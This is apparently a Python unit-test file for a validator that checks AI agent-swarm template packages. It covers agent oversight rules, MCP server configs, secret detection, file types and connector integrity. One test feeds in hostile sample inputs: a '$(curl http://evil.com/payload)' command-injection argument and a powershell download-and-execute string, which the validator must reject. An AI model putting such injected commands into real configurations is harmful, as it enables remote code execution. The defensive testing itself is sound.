
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

try:
    from scripts.migrate_consumer_contract import (
        migrated_agent,
        migrated_mcp_config,
        migrated_skills,
        migrated_workflow,
    )
    from scripts.validate_template import (
        TEMPLATE_FILE_SUFFIXES,
        TEMPLATE_SKILL_FILE_SUFFIXES,
        ValidationReport,
        detect_embedded_secrets,
        validate_agent_payload,
        validate_connector_dependencies,
        validate_connector_integrity,
        validate_knowledge_payload,
        validate_mcp_payload,
        validate_package_file,
        validate_package_tree,
        validate_template,
        validate_workflow_content,
    )
    from scripts.verify_compatibility_lock import generate_lock_data, verify_lockfile
except ImportError:
    from migrate_consumer_contract import (
        migrated_agent,
        migrated_mcp_config,
        migrated_skills,
        migrated_workflow,
    )
    from validate_template import (
        TEMPLATE_FILE_SUFFIXES,
        TEMPLATE_SKILL_FILE_SUFFIXES,
        ValidationReport,
        detect_embedded_secrets,
        validate_agent_payload,
        validate_connector_dependencies,
        validate_connector_integrity,
        validate_knowledge_payload,
        validate_mcp_payload,
        validate_package_file,
        validate_package_tree,
        validate_template,
        validate_workflow_content,
    )
    from verify_compatibility_lock import generate_lock_data, verify_lockfile


class ConsumerContractTests(unittest.TestCase):
    def valid_agent(self):
        return {
            "id": "agent-one",
            "name": "Agent One",
            "role": "Reviewer",
            "department": "Quality",
            "description": "Reviews artifacts.",
            "status": "idle",
            "model_config": {
                "provider": "google",
                "model_id": "gemma4:31b",
                "system_prompt": "Review carefully.",
            },
            "skills": ["read_file"],
            "workflows": ["review"],
            "mcp_tools": [],
            "requires_oversight": False,
        }

    def test_agent_requires_consumer_wire_fields(self):
        agent = self.valid_agent()
        del agent["status"]
        del agent["model_config"]["provider"]
        errors = validate_agent_payload(agent)
        self.assertIn("status must be a non-empty string", errors)
        self.assertIn("model_config.provider must be a non-empty string", errors)

    def test_agent_migration_is_additive_and_idempotent(self):
        source = self.valid_agent()
        source.pop("status")
        source["model_config"].pop("provider")
        source["model_config"].pop("model_id")
        source["custom_extension"] = {"preserved": True}
        once = migrated_agent(source, "gemma4:31b")
        twice = migrated_agent(once, "gemma4:31b")
        self.assertEqual(once, twice)
        self.assertTrue(once["custom_extension"]["preserved"])
        self.assertEqual([], validate_agent_payload(once))

    def test_agent_migrates_native_status_skills_and_oversight(self):
        source = self.valid_agent()
        source["status"] = "ready"
        source["skills"] = ["read_file", "run_command", "write_to_file"]
        source.pop("mcp_tools")
        source.pop("requires_oversight")
        migrated = migrated_agent(source, "gemma4:31b")
        self.assertEqual("idle", migrated["status"])
        self.assertEqual(
            ["read_file", "execute_shell", "shell", "write_file"],
            migrated["skills"],
        )
        self.assertEqual([], migrated["mcp_tools"])
        self.assertTrue(migrated["requires_oversight"])
        self.assertEqual([], validate_agent_payload(migrated))
        self.assertEqual(migrated["skills"], migrated_skills(migrated["skills"]))

    def test_agent_rejects_legacy_or_unprotected_dangerous_capabilities(self):
        agent = self.valid_agent()
        agent["skills"] = ["run_command", "execute_shell"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("legacy Tadpole capability" in error for error in errors))
        self.assertTrue(any("capability marker" in error for error in errors))
        self.assertTrue(any("require oversight" in error for error in errors))

    def test_agent_rejects_inactive_mcp_declaration_format(self):
        agent = self.valid_agent()
        agent["mcp_tools"] = ["server-only-placeholder"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("server:tool" in error for error in errors))

    def test_agent_rejects_wildcard_mcp_declarations(self):
        agent = self.valid_agent()
        agent["mcp_tools"] = ["crm:*"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("wildcards server:* are prohibited" in error for error in errors))

    def test_agent_rejects_incompatible_model_provider_pairings(self):
        agent = self.valid_agent()
        agent["model_config"]["provider"] = "google"
        agent["model_config"]["model_id"] = "llama-3.3-70b-versatile"
        errors = validate_agent_payload(agent)
        self.assertTrue(any("cannot be paired with" in error for error in errors))

    def test_agent_rejects_system_prompt_exceeding_800_chars(self):
        agent = self.valid_agent()
        agent["model_config"]["system_prompt"] = "A" * 801
        errors = validate_agent_payload(agent)
        self.assertTrue(any("exceeds 800 characters" in error for error in errors))

        agent["model_config"]["system_prompt"] = "A" * 800
        errors = validate_agent_payload(agent)
        self.assertEqual([], errors)

    def test_cross_validation_rejects_stale_swarm_agents_array(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "agents": ["stale-agent-id"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("swarm agents array does not match roster IDs" in error for error in report.errors))


    def test_cross_validation_rejects_unused_active_mcp_server(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "connector_ids": ["test-server"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = []
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(json.dumps({
                "mcpServers": {
                    "test-server": {"command": "python", "args": ["server.py"], "env": {}}
                }
            }), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("has no authorized agent grants" in error for error in report.errors))

    def test_cross_validation_rejects_dangling_mcp_grants(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["nonexistent-server:some_tool"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(json.dumps({"mcpServers": {}}), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("dangling MCP grant" in error for error in report.errors))

    def test_cross_validation_enforces_oversight_on_mutating_mcp_grants(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "connector_ids": ["generic-crm"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["generic-crm:update_invoice"]  # mutating write tool
            agent["requires_oversight"] = False
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcp_registry.json").write_text((ROOT / "mcp_registry.json").read_text(encoding="utf-8"), encoding="utf-8")

            report = ValidationReport()
            validate_template(tmproot, {"id": "test-swarm", "path": "."}, report)
            self.assertTrue(any("mutating MCP tool grant 'generic-crm:update_invoice' requires oversight" in err for err in report.errors))

            # Test encoded mcp__server__tool format enforces oversight as well
            agent["mcp_tools"] = ["mcp__generic-crm__update_invoice"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            report2 = ValidationReport()
            validate_template(tmproot, {"id": "test-swarm", "path": "."}, report2)
            self.assertTrue(any("mutating MCP tool grant 'mcp__generic-crm__update_invoice' requires oversight" in err for err in report2.errors))

    def test_workflow_accepts_consumer_h2_or_h3_boundaries_and_ignores_fenced_blocks(self):
        self.assertEqual([], validate_workflow_content("# Review\n\n### Inspect\nDo it."))
        self.assertNotEqual([], validate_workflow_content("# Review\n\nDo it."))
        fenced_only = "# Review\n\n```markdown\n## Step 1: Scoping\nInside code block\n```\n"
        self.assertNotEqual([], validate_workflow_content(fenced_only))

    def test_workflow_migration_preserves_numbered_instructions(self):
        source = "# Workflow: Review\n\n1. Inspect the input.\n2. Report findings.\n"
        migrated = migrated_workflow(source)
        self.assertIn("## Step 1\n\nInspect the input.", migrated)
        self.assertIn("## Step 2\n\nReport findings.", migrated)
        self.assertEqual(migrated, migrated_workflow(migrated))

    def test_mcp_contract_requires_root_map(self):
        self.assertNotEqual([], validate_mcp_payload({}))
        migrated = migrated_mcp_config({})
        self.assertEqual({"mcpServers": {}}, migrated)
        self.assertEqual([], validate_mcp_payload(migrated))

    def test_mcp_security_contract_rejects_commands_inline_code_and_credentials(self):
        config = {
            "mcpServers": {
                "unsafe": {
                    "command": "powershell",
                    "args": ["-c", "download; execute"],
                    "env": {"API_TOKEN": "actual-production-token"},
                },
                "injection": {
                    "command": "python",
                    "args": ["$(curl http://evil.com/payload)"],
                    "env": {},
                },
                "var_expansion": {
                    "command": "python",
                    "args": ["${EVIL_VAR}"],
                    "env": {},
                }
            }
        }
        errors = validate_mcp_payload(config)
        self.assertTrue(any("approved executable" in error for error in errors))
        self.assertTrue(any("shell control syntax" in error for error in errors))
        self.assertTrue(any("local-configuration placeholder" in error for error in errors))

        safe = {
            "mcpServers": {
                "reviewed": {
                    "command": "python",
                    "args": ["server.py"],
                    "env": {"API_TOKEN": "CONFIGURE_LOCALLY"},
                }
            }
        }
        self.assertEqual([], validate_mcp_payload(safe))

    def test_package_security_contract_rejects_binary_types_and_embedded_secrets(self):
        errors = validate_package_file(
            "payload.exe", ".exe", 9, b"MZ\x00payload", TEMPLATE_FILE_SUFFIXES
        )
        errors += validate_package_file(
            "notes.md",
            ".md",
            47,
            ("token: ghp_" + ("a" * 36)).encode(),
            TEMPLATE_FILE_SUFFIXES,
        )
        self.assertTrue(any("prohibited file type" in error for error in errors))
        self.assertTrue(any("likely GitHub token" in error for error in errors))

    def test_template_package_allows_reviewable_source_only_under_skills(self):
        self.assertEqual(
            [],
            validate_package_file(
                "skills/connector.py",
                ".py",
                12,
                b"print('ok')",
                TEMPLATE_SKILL_FILE_SUFFIXES,
            ),
        )
        self.assertNotEqual(
            [],
            validate_package_file(
                "connector.py",
                ".py",
                12,
                b"print('ok')",
                TEMPLATE_FILE_SUFFIXES,
            ),
        )

    def test_secret_detection_does_not_return_secret_material(self):
        findings = detect_embedded_secrets("-----BEGIN PRIVATE KEY-----\nsensitive\n")
        self.assertEqual(["private key"], findings)

    def test_knowledge_requires_text_and_topic(self):
        self.assertEqual([], validate_knowledge_payload([{"text": "Body", "topic": "legal"}]))
        self.assertNotEqual([], validate_knowledge_payload([{"topic": "legal"}]))

    def test_package_tree_isolation_in_temp_directory(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            (tmproot / "agents").mkdir()
            (tmproot / "agents" / "agent.json").write_text("{}", encoding="utf-8")
            (tmproot / "skills").mkdir()
            (tmproot / "skills" / "server.py").write_text("print('ok')", encoding="utf-8")

            # Valid tree
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES, executable_subdir="skills")
            self.assertEqual([], errors)

            # Invalid: python script placed directly outside skills/
            (tmproot / "bad_script.py").write_text("print('bad')", encoding="utf-8")
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES, executable_subdir="skills")
            self.assertTrue(any("prohibited file type" in error for error in errors))

    def test_connector_dependencies_require_exact_matching_provenance(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            connector_root = Path(tmpdir)
            (connector_root / "requirements.txt").write_text(
                "mcp==1.29.1\n", encoding="utf-8"
            )
            connector = {
                "dependency_manifest": "requirements.txt",
                "dependency_provenance": [
                    {
                        "package": "mcp",
                        "version": "1.29.1",
                        "artifact": "mcp-1.29.1-py3-none-any.whl",
                        "sha256": "a" * 64,
                        "source": "https://pypi.org/project/mcp/1.29.1/",
                    }
                ],
            }

            self.assertEqual(
                [], validate_connector_dependencies(connector_root, connector)
            )

            (connector_root / "requirements.txt").write_text(
                "mcp>=1.29.1\n", encoding="utf-8"
            )
            errors = validate_connector_dependencies(connector_root, connector)
            self.assertTrue(any("exact package==version" in error for error in errors))
            self.assertTrue(any("exactly match" in error for error in errors))

    def test_connector_integrity_detects_entrypoint_tampering(self):
        import hashlib
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            connector_root = Path(tmpdir)
            server = connector_root / "server.py"
            server.write_text("print('ready')\n", encoding="utf-8")
            digest = hashlib.sha256(server.read_bytes()).hexdigest()
            connector = {"integrity_hash": f"sha256:{digest}"}

            self.assertEqual([], validate_connector_integrity(connector_root, connector))

            server.write_text("print('changed')\n", encoding="utf-8")
            errors = validate_connector_integrity(connector_root, connector)
            self.assertTrue(any("does not match" in error for error in errors))

    def test_compatibility_lockfile_integrity_and_drift_detection(self):
        self.assertTrue(verify_lockfile())
        lock_data = generate_lock_data()
        self.assertEqual("1.0.0", lock_data["version"])
        self.assertIn("scripts/validate_template.py", lock_data["critical_contract_files"])


if __name__ == "__main__":
    unittest.main()
